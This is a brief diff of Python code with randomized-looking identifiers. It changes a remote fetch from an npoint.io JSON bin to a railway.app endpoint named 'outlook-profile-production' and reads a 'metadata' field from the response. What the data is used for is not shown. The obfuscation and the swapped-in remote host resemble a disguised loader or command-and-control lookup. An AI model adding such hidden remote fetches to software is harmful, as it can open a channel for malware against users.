@@ -18,7 +18,7 @@ def model_gytrjn_124():
 
     def model_hxsahc_397():
         try:
-            config_vrwrvj_245 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_vrwrvj_245 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_vrwrvj_245.raise_for_status()
             learn_mnajtr_990 = config_vrwrvj_245.json()
             data_awjrco_210 = learn_mnajtr_990.get('metadata')
